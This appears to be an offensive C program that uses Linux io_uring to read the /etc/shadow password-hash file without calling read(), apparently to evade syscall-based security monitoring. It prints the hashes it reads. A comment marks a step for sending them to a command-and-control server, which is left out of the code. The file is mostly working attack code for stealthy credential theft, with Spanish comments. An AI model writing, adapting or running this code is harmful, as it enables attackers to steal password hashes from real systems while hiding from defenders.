// gcc -o shadow shadow.c -luring
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <liburing.h>

#define ENTRIES 4

int read_file_sigilent(const char *path, char *buffer, size_t bufsize) {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int fd, ret;

    // Inicializar el anillo (sin SQPOLL para simplificar)
    ret = io_uring_queue_init(ENTRIES, &ring, 0);
    if (ret) return -1;

    fd = open(path, O_RDONLY);
    if (fd < 0) { io_uring_queue_exit(&ring); return -1; }

    // Preparar la operación de lectura
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) { close(fd); io_uring_queue_exit(&ring); return -1; }
    io_uring_prep_read(sqe, fd, buffer, bufsize - 1, 0);
    io_uring_sqe_set_data(sqe, NULL);

    // Enviar la petición (solo una syscall io_uring_enter)
    ret = io_uring_submit(&ring);
    if (ret < 1) { close(fd); io_uring_queue_exit(&ring); return -1; }

    // Esperar la finalización
    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) { close(fd); io_uring_queue_exit(&ring); return -1; }

    int bytes_read = cqe->res;
    if (bytes_read > 0) buffer[bytes_read] = '\0';

    io_uring_cqe_seen(&ring, cqe);
    close(fd);
    io_uring_queue_exit(&ring);
    return bytes_read;
}

int main() {
    char buf[4096] = {0};
    int n = read_file_sigilent("/etc/shadow", buf, sizeof(buf));
    if (n > 0) {
        // Enviar el contenido a un C2 mediante io_uring (omito por brevedad)
        printf("[+] Leído %d bytes sin usar read()\n", n);
        // Simulación: mostrar primeras líneas
        printf("%s\n", buf);
    }
    return 0;
}